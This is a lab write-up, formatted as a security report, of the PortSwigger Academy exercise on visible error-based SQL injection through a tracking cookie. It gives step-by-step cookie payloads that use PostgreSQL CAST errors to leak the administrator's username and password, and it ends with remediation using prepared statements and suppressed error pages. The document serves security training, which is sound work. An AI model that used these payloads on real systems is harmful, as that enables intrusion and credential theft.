# Visible Error-Based SQL Injection

## 1. Vulnerability Title & Severity
* **Vulnerability Title**: **Visible Error-Based SQL Injection via Tracking Cookie**
* **Estimated Severity**: **Critical** (CVSS v3.1 Score: 9.8 / 10.0)

## 2. Lab/Target Description
The target application is a web-based shopping platform provided by the PortSwigger Web Security Academy. The specific objective of this lab is to exploit a **visible error-based SQL injection** vulnerability residing within the tracking mechanism to leak database structure and sensitive data, ultimately retrieving the password of the administrative user (`administrator`) to log into the application.

## 3. Executive Summary
During the security assessment of the target application, a critical SQL injection vulnerability was discovered in how the application processes the `TrackingId` cookie value. Due to a lack of input sanitization and a database configuration that verbosely echoes database engine error messages directly to the client browser, an attacker can manipulate SQL queries executed by the backend server. By using conditional casting techniques to trigger deliberate runtime type-conversion errors, the database was forced to dump internal information. This flaw allowed for complete data extraction, resulting in the compromise of the administrative user account's credentials and full takeover of the application instance.

## 4. Tools Used
* **Burp Suite Community Edition (v2026.10)**: Used for capturing, inspecting, and replaying modified HTTP requests via the Proxy and Repeater components.
* **Chromium Browser**: Used to navigate the application, inspect rendering, and verify successful exploitation.

## 5. Step-by-Step Walkthrough

### Step 1: Mapping the Attack Surface and Identifying the Parameter
The initial stage involved exploring the application and intercepting a standard baseline request to map out potential injection points.

```http
GET / HTTP/2
Host: 0adc00d203271b0c82de93ca00060092.web-security-academy.net
Cookie: TrackingId=N8CKRzYeEixzy22O; session=TJztFaSiqmB5cNy679VOSPUOkGMAiPMn
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36
```

The application tracks user behavior utilizing a unique identifier stored inside the `TrackingId` cookie. This value was highlighted as a high-value target for injection analysis.

`[Insert Screenshot 1: Baseline HTTP request intercepted in Burp Suite Proxy, highlighting the TrackingId cookie parameter]`

---

### Step 2: Testing for SQL Injection via Syntax Modification
To determine whether the `TrackingId` cookie directly interacts with a backend database query, the request was sent to **Burp Suite Repeater**, and a single quote (`'`) was appended to the tracking string.

```http
Cookie: TrackingId=N8CKRzYeEixzy22O'; session=TJztFaSiqmB5cNy679VOSPUOkGMAiPMn
```

The application responded with a `500 Internal Server Error`, breaking the layout and signaling a raw syntax syntax misalignment within the database interpreter.

`[Insert Screenshot 2: Application returning a 500 Internal Server Error after a single quote is appended to the cookie]`

---

### Step 3: Verifying the SQL Injection Entry Point
To confirm the injection point, a SQL comment indicator (`--`) was appended after the single quote to neutralize any trailing application-side SQL fragments.

```http
Cookie: TrackingId=N8CKRzYeEixzy22O'--; session=TJztFaSiqmB5cNy679VOSPUOkGMAiPMn
```

The backend processed the query successfully without an error, returning a standard `200 OK` response. This behavior confirms an active, unescaped SQL injection entry point within the `TrackingId` processing scope.

`[Insert Screenshot 3: Application returning a normal 200 OK response when comment characters are used to fix the query]`

---

### Step 4: Constructing a Type-Casting Error Payload
With the injection confirmed, the next objective was to force a type-conversion error capable of surfacing information inside the application's error response. A `CAST()` function wrapped inside a conditional statement was appended.

```http
Cookie: TrackingId=N8CKRzYeEixzy22O' AND CAST((SELECT 1) AS INT)--; session=TJztFaSiqmB5cNy679VOSPUOkGMAiPMn
```

The server responded with an error stating: `ERROR: argument of AND must be type boolean, not type integer`. This message reveals two critical facts: the database engine is **PostgreSQL**, and the query error messages are directly mapped back onto the visible web response page.

`[Insert Screenshot 4: Server error message showing that the argument of an AND clause must be boolean]`

---

### Step 5: Adjusting the Boolean Context for Data Retrieval
To resolve the structural syntax requirement of the `AND` clause, the payload was adjusted so the condition evaluates to a boolean statement while maintaining the type-mismatch exploit within the subquery.

```http
Cookie: TrackingId=N8CKRzYeEixzy22O' AND 1=CAST((SELECT 1) AS INT)--; session=TJztFaSiqmB5cNy679VOSPUOkGMAiPMn
```

Because `1` matches the successfully cast integer value of `1`, the entire condition evaluated smoothly, confirming the syntax block layout was valid for arbitrary query building.

`[Insert Screenshot 5: Clean 200 OK response indicating successful structural construction of the boolean comparison]`

---

### Step 6: Triggering Information Extraction from Internal Tables
Next, the subquery was altered to query structural data. The goal was to cast text-based data (like a table string) into an integer type, forcing the database engine to print the text value within the error message.

```http
Cookie: TrackingId=N8CKRzYeEixzy22O' AND 1=CAST((SELECT username FROM users) AS INT)--; session=TJztFaSiqmB5cNy679VOSPUOkGMAiPMn
```

The database hit a separate query rule error first: `ERROR: more than one row returned by a subquery used as an expression`. This confirmed the target table `users` exists and contains multiple records.

`[Insert Screenshot 6: Subquery cardinality error proving the existence of the target users table]`

---

### Step 7: Isolating the Target Account Using Limit Clauses
To overcome the multi-row error constraint, a `LIMIT 1` clause was appended to isolate exactly one record from the subquery expression.

```http
Cookie: TrackingId=N8CKRzYeEixzy22O' AND 1=CAST((SELECT username FROM users LIMIT 1) AS INT)--; session=TJztFaSiqmB5cNy679VOSPUOkGMAiPMn
```

The database processed the single record and attempted to cast the string `"administrator"` into an integer. It failed dramatically, leaking the data directly: `ERROR: invalid input syntax for type integer: "administrator"`.

`[Insert Screenshot 7: Successful error-based leak disclosing the administrator username]`

---

### Step 8: Dumping the Target User's Credentials
The data column target in the subquery expression was shifted from `username` to `password` to force a similar conversion failure on the administrator's credential string.

```http
Cookie: TrackingId=N8CKRzYeEixzy22O' AND 1=CAST((SELECT password FROM users LIMIT 1) AS INT)--; session=TJztFaSiqmB5cNy679VOSPUOkGMAiPMn
```

The application generated the corresponding runtime failure, revealing the password string cleanly inside the visible webpage error message block.

```text
ERROR: invalid input syntax for type integer: "1g5tf79ckfdmnq4ht0yb"
```

`[Insert Screenshot 8: Database conversion error revealing the plaintext administrative password string]`

---

### Step 9: Achieving Verification and Administrative Takeover
Using the dumped string (`1g5tf79ckfdmnq4ht0yb`), an authentication request was submitted at the platform's `/login` gateway. The application successfully validated the credential string, completing account takeover and resolving the objective context.

`[Insert Screenshot 9: Administrative dashboard confirming successful login and completion of the target exercise]`

---

## 6. Impact Analysis
* **Confidentiality (High)**: An attacker can query any internal table, data relation, or schema configuration mapping exposed to the web application's database service connection context.
* **Integrity (High)**: Depending on underlying connection permissions, an attacker could potentially invoke write, update, or structural commands, destroying database data or altering access maps.
* **Account Takeover**: As demonstrated, administrative credentials were recovered directly without brute-force requirements, giving an unauthorized user absolute administrative parity over the platform ecosystem.

---

## 7. Remediation

### Primary Fix: Use Parameterized Queries (Prepared Statements)
The root cause of this vulnerability is the dynamic concatenation of user-supplied data into a structural SQL statement. Implement parameterized queries to ensure that inputs are processed strictly as data, never as executable code.

**Vulnerable Conceptual Logic:**
```java
// Dangerously interpolating cookie variables directly into SQL structure
String query = "SELECT * FROM tracking WHERE id = '" + trackingId + "'";
Statement statement = connection.createStatement();
ResultSet resultSet = statement.executeQuery(query);
```

**Secure Remediation Pattern:**
```java
// Forcing strict data binding via PreparedStatements
String query = "SELECT * FROM tracking WHERE id = ?";
PreparedStatement pstmt = connection.prepareStatement(query);
pstmt.setString(1, trackingId);
ResultSet resultSet = pstmt.executeQuery();
```

### Secondary Fix: Generic Error Handling
Configure the application environment and web server settings to suppress verbose system, database engine, or stack trace exceptions to the end-user interface. Implement generic global error wrappers.

```xml
<!-- Example: Global web.xml mapping to suppress raw database system exceptions -->
<error-page>
    <error-code>500</error-code>
    <location>/error/generic-fallback.html</location>
</error-page>
```
